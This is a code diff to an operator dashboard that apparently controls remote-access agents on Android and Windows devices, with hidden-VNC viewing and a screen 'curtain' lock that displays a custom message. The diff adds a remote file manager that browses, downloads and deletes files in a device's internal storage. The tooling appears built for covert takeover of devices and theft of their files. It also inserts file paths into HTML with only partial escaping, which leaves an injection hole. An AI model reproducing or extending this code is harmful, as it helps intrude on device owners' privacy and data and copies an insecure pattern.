@@ -458,6 +458,10 @@ function renderAgentTable() {
                         <span>Control</span>
                     </button>
                     ${isAndroidAgent ? `
+                    <button class="btn-action-control btn-action-files" ${!isOnline ? 'disabled' : ''} onclick="openFileManagerModal('${agent.agent_id}', event)" title="Browse device internal storage & files">
+                        <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
+                        <span>Files</span>
+                    </button>
                     <button class="btn-action-control btn-action-lock ${isCurtainLocked ? 'btn-active-curtain' : ''}" onclick="${isCurtainLocked ? `unlockAndroidDevice('${agent.agent_id}', event)` : `openLockDeviceModal('${agent.agent_id}', event)`}" title="${isCurtainLocked ? 'Unlock Android Device (Restore Home Screen)' : (isOnline ? 'Lock Android Device (Display Custom Message)' : 'Queue Device Lock (Will automatically lock when device connects)')}">
                         <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                         <span>${isCurtainLocked ? 'Unlock' : 'Lock Device'}</span>
@@ -1417,7 +1421,10 @@ function resizeHvncDisplay() {
 }
 
 function openViewerTab(agentId, mode = 'backstage') {
-    window.open(`/viewer/${agentId}?mode=${mode}`, '_blank');
+    const ag = (endpoints || []).find(a => a.agent_id === agentId);
+    const isAndroid = ag && (ag.is_android || (ag.arch || '').toLowerCase() === 'android' || (ag.platform || '').toLowerCase() === 'android' || (ag.os || '').toLowerCase().includes('android'));
+    const platformParam = isAndroid ? '&platform=android' : '&platform=windows';
+    window.open(`/viewer/${agentId}?mode=${mode}${platformParam}`, '_blank');
 }
 
 function openHvncTab(agentId) {
@@ -1935,5 +1942,300 @@ async function createInstallationInvitationCode() {
         fetchInstallationsData();
     } catch (e) {
         document.getElementById('installationInvitationResult').textContent = 'Cannot create invitation: ' + e.message;
+    }
+}
+
+// =================================================================
+// Android Device File Manager Client Logic
+// =================================================================
+let fmCurrentPath = "/storage/emulated/0";
+let fmHistory = [];
+let fmHistoryIndex = -1;
+let fmCurrentEntries = [];
+let fmCurrentAgentId = "";
+
+function openFileManagerModal(targetAgentId, event) {
+    if (event) event.stopPropagation();
+    fmCurrentAgentId = targetAgentId || "";
+    const modal = document.getElementById("fileManagerModal");
+    if (modal) {
+        modal.style.display = "flex";
+        modal.classList.add("active");
+    }
+    const titleEl = document.getElementById("fmModalTitle");
+    if (titleEl) {
+        titleEl.innerText = `Android File Manager — [${fmCurrentAgentId}]`;
+    }
+    if (fmHistory.length === 0) {
+        fmLoadDirectory("/storage/emulated/0", true);
+    } else {
+        fmRefresh();
+    }
+}
+
+function closeFileManagerModal() {
+    const modal = document.getElementById("fileManagerModal");
+    if (modal) {
+        modal.style.display = "none";
+        modal.classList.remove("active");
+    }
+}
+
+async function fmLoadDirectory(targetPath, pushHistory = true) {
+    if (!fmCurrentAgentId) return;
+    const loading = document.getElementById("fmLoadingOverlay");
+    if (loading) loading.style.display = "flex";
+
+    try {
+        const res = await fetch(`/api/agent/${fmCurrentAgentId}/files/list`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ path: targetPath || "" })
+        });
+
+        if (!res.ok) {
+            const err = await res.json().catch(() => ({}));
+            showNotification(err.msg || err.detail || "Unable to list directory", "error");
+            if (loading) loading.style.display = "none";
+            return;
+        }
+
+        const data = await res.json();
+        if (!data.success) {
+            showNotification(data.msg || "Cannot read storage directory", "error");
+            if (loading) loading.style.display = "none";
+            return;
+        }
+
+        fmCurrentPath = data.path || targetPath || "/";
+        const pathInput = document.getElementById("fmCurrentPathInput");
+        if (pathInput) pathInput.value = fmCurrentPath;
+
+        if (pushHistory) {
+            if (fmHistoryIndex < fmHistory.length - 1) {
+                fmHistory = fmHistory.slice(0, fmHistoryIndex + 1);
+            }
+            fmHistory.push(fmCurrentPath);
+            fmHistoryIndex = fmHistory.length - 1;
+        }
+
+        updateFmNavButtons();
+        fmCurrentEntries = data.entries || [];
+        renderFmEntries(fmCurrentEntries);
+
+        if (data.shortcuts && data.shortcuts.length > 0) {
+            renderFmShortcuts(data.shortcuts);
+        }
+
+    } catch (err) {
+        showNotification(err.message, "error");
+    } finally {
+        if (loading) loading.style.display = "none";
+    }
+}
+
+function updateFmNavButtons() {
+    const btnBack = document.getElementById("fmBtnBack");
+    const btnFwd = document.getElementById("fmBtnForward");
+    const btnUp = document.getElementById("fmBtnUp");
+    if (btnBack) btnBack.disabled = (fmHistoryIndex <= 0);
+    if (btnFwd) btnFwd.disabled = (fmHistoryIndex >= fmHistory.length - 1);
+    if (btnUp) btnUp.disabled = (!fmCurrentPath || fmCurrentPath === "/" || fmCurrentPath === "");
+}
+
+function fmNavigateBack() {
+    if (fmHistoryIndex > 0) {
+        fmHistoryIndex--;
+        fmLoadDirectory(fmHistory[fmHistoryIndex], false);
+    }
+}
+
+function fmNavigateForward() {
+    if (fmHistoryIndex < fmHistory.length - 1) {
+        fmHistoryIndex++;
+        fmLoadDirectory(fmHistory[fmHistoryIndex], false);
+    }
+}
+
+function fmNavigateUp() {
+    if (!fmCurrentPath || fmCurrentPath === "/") return;
+    const parts = fmCurrentPath.replace(/\/+$/, '').split('/').filter(Boolean);
+    parts.pop();
+    const parentPath = parts.length > 0 ? '/' + parts.join('/') : '/';
+    fmLoadDirectory(parentPath, true);
+}
+
+function fmRefresh() {
+    fmLoadDirectory(fmCurrentPath, false);
+}
+
+function fmGoToPath(path) {
+    const trimmed = (path || "").trim();
+    fmLoadDirectory(trimmed, true);
+}
+
+function renderFmShortcuts(shortcuts) {
+    const row = document.getElementById("fmShortcutsRow");
+    if (!row || !shortcuts) return;
+    row.innerHTML = shortcuts.map(s => {
+        const icon = s.name.includes("Download") ? "📥" :
+                     s.name.includes("Document") ? "📄" :
+                     s.name.includes("Picture") ? "🖼️" :
+                     s.name.includes("DCIM") ? "📸" :
+                     s.name.includes("Music") ? "🎵" :
+                     s.name.includes("Internal") ? "📱" : "📂";
+        const safePath = (s.path || "").replace(/'/g, "\\'");
+        return `<button class="btn btn-secondary" onclick="fmGoToPath('${safePath}')" style="padding: 3px 8px; font-size: 11px;" title="${s.path}">${icon} ${escapeHtml(s.name)}</button>`;
+    }).join("");
+}
+
+function fmGetFileIcon(entry) {
+    if (entry.is_dir) return "📁";
+    const name = (entry.name || "").toLowerCase();
+    if (name.endsWith(".apk")) return "📦";
+    if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") || name.endsWith(".webp") || name.endsWith(".gif")) return "🖼️";
+    if (name.endsWith(".mp4") || name.endsWith(".mkv") || name.endsWith(".webm") || name.endsWith(".3gp")) return "🎬";
+    if (name.endsWith(".mp3") || name.endsWith(".m4a") || name.endsWith(".ogg") || name.endsWith(".wav") || name.endsWith(".aac")) return "🎵";
+    if (name.endsWith(".pdf") || name.endsWith(".doc") || name.endsWith(".docx")) return "📄";
+    if (name.endsWith(".zip") || name.endsWith(".tar") || name.endsWith(".gz") || name.endsWith(".7z") || name.endsWith(".rar")) return "🗜️";
+    if (name.endsWith(".txt") || name.endsWith(".json") || name.endsWith(".log") || name.endsWith(".xml") || name.endsWith(".html")) return "📝";
+    return "📄";
+}
+
+function fmFormatSize(bytes) {
+    if (bytes === null || bytes === undefined || bytes < 0) return "—";
+    if (bytes === 0) return "0 B";
+    const units = ["B", "KB", "MB", "GB", "TB"];
+    const i = Math.floor(Math.log(bytes) / Math.log(1024));
+    return (bytes / Math.pow(1024, i)).toFixed(i === 0 ? 0 : 1) + " " + units[i];
+}
+
+function fmFormatDate(epochSeconds) {
+    if (!epochSeconds) return "—";
+    try {
+        const d = new Date(epochSeconds * 1000);
+        return d.toLocaleDateString() + " " + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+    } catch (e) {
+        return "—";
+    }
+}
+
+function renderFmEntries(entries) {
+    const tbody = document.getElementById("fmTableBody");
+    const statusInfo = document.getElementById("fmStatusBarInfo");
+    if (!tbody) return;
+
+    if (!entries || entries.length === 0) {
+        tbody.innerHTML = `<tr><td colspan="4" style="text-align: center; padding: 24px; color: var(--text-muted, #64748b); font-size: 12px;">This directory is empty or inaccessible.</td></tr>`;
+        if (statusInfo) statusInfo.innerText = "0 items";
+        return;
+    }
+
+    let dirCount = 0;
+    let fileCount = 0;
+    let totalBytes = 0;
+
+    const rowsHtml = entries.map(entry => {
+        if (entry.is_dir) {
+            dirCount++;
+        } else {
+            fileCount++;
+            totalBytes += (entry.size || 0);
+        }
+
+        const icon = fmGetFileIcon(entry);
+        const safePath = (entry.path || "").replace(/'/g, "\\'");
+        const safeName = (entry.name || "").replace(/'/g, "\\'");
+        const sizeStr = entry.is_dir ? "—" : fmFormatSize(entry.size);
+        const dateStr = fmFormatDate(entry.last_modified);
+
+        const rowClick = entry.is_dir ? `ondblclick="fmGoToPath('${safePath}')"` : `ondblclick="fmDownloadFile('${safePath}', '${safeName}')"`;
+        const cursorStyle = entry.is_dir ? 'cursor: pointer;' : 'cursor: default;';
+
+        return `
+            <tr style="${cursorStyle} border-bottom: 1px solid rgba(255,255,255,0.04); transition: background 0.1s;" onmouseover="this.style.background='rgba(56,189,248,0.06)'" onmouseout="this.style.background=''" ${rowClick}>
+                <td style="padding: 7px 12px; display: flex; align-items: center; gap: 8px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    <span style="font-size: 15px; flex-shrink: 0;">${icon}</span>
+                    <span style="color: ${entry.is_dir ? '#38bdf8' : '#e2e8f0'}; font-weight: ${entry.is_dir ? '600' : '400'}; overflow: hidden; text-overflow: ellipsis;" title="${escapeHtml(entry.name)}">
+                        ${escapeHtml(entry.name)}
+                    </span>
+                </td>
+                <td style="padding: 7px 12px; color: #94a3b8; font-family: ui-monospace, monospace; font-size: 11px;">${sizeStr}</td>
+                <td style="padding: 7px 12px; color: var(--text-muted, #64748b); font-size: 11px;">${dateStr}</td>
+                <td style="padding: 7px 12px; text-align: right; white-space: nowrap;">
+                    ${entry.is_dir ? `
+                        <button class="btn btn-secondary" onclick="fmGoToPath('${safePath}')" style="padding: 2px 7px; font-size: 10px;" title="Open folder">Open 📂</button>
+                    ` : `
+                        <button class="btn btn-secondary" onclick="fmDownloadFile('${safePath}', '${safeName}')" style="padding: 2px 7px; font-size: 10px; color: #38bdf8; border-color: rgba(56,189,248,0.4);" title="Download file to computer">⬇ Download</button>
+                    `}
+                    <button class="btn btn-secondary" onclick="fmDeleteFile('${safePath}', '${safeName}')" style="padding: 2px 6px; font-size: 10px; color: #f87171; border-color: rgba(239,68,68,0.3); margin-left: 4px;" title="Delete file">🗑</button>
+                </td>
+            </tr>
+        `;
+    }).join("");
+
+    tbody.innerHTML = rowsHtml;
+    if (statusInfo) {
+        statusInfo.innerText = `${dirCount} folder${dirCount === 1 ? '' : 's'}, ${fileCount} file${fileCount === 1 ? '' : 's'} (${fmFormatSize(totalBytes)})`;
+    }
+}
+
+function fmFilterFiles(query) {
+    const q = (query || "").trim().toLowerCase();
+    if (!q) {
+        renderFmEntries(fmCurrentEntries);
+        return;
+    }
+    const filtered = (fmCurrentEntries || []).filter(e => (e.name || "").toLowerCase().includes(q));
+    renderFmEntries(filtered);
+}
+
+async function fmDownloadFile(filePath, fileName) {
+    if (!fmCurrentAgentId) return;
+    showNotification(`Requesting ${fileName} from device...`, "info");
+    try {
+        const res = await fetch(`/api/agent/${fmCurrentAgentId}/files/download`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ path: filePath })
+        });
+        if (!res.ok) {
+            const err = await res.json().catch(() => ({}));
+            showNotification(err.msg || err.detail || "Cannot read file", "error");
+            return;
+        }
+        const blob = await res.blob();
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = fileName || "download";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+        showNotification(`Saved ${fileName}`, "success");
+    } catch (e) {
+        showNotification(e.message, "error");
+    }
+}
+
+async function fmDeleteFile(filePath, fileName) {
+    if (!confirm(`Are you sure you want to delete "${fileName}" from the remote device?`)) return;
+    if (!fmCurrentAgentId) return;
+    try {
+        const res = await fetch(`/api/agent/${fmCurrentAgentId}/files/delete`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ path: filePath })
+        });
+        const data = await res.json();
+        if (data.success) {
+            showNotification(`Deleted ${fileName}`, "success");
+            fmRefresh();
+        } else {
+            showNotification(data.msg || "Operation failed", "error");
+        }
+    } catch (e) {
+        showNotification(e.message, "error");
     }
 }
